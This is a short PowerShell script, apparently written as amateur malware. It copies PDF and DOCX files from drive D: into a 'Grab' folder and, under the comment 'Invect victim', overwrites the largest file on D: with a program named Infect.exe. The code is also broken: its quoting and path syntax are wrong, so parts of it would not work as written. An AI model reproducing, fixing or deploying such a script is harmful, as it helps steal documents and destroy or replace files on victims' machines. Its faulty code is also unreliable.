$output = "%User%\Desktop\Grab"
$input = "D:\*.pdf,*.docx"
$inputv = "%User%\Desktop\V\Infect.exe"
Copy-Item -path $input -destination $output
#Invect victim
$sise = "(gci -path "D:\" -r | sort Length -desc | select fullname -f 1)"
$size = "D:\$sise"
#Remove-Item -path $size
Copy-Item -path $inputv -destination $size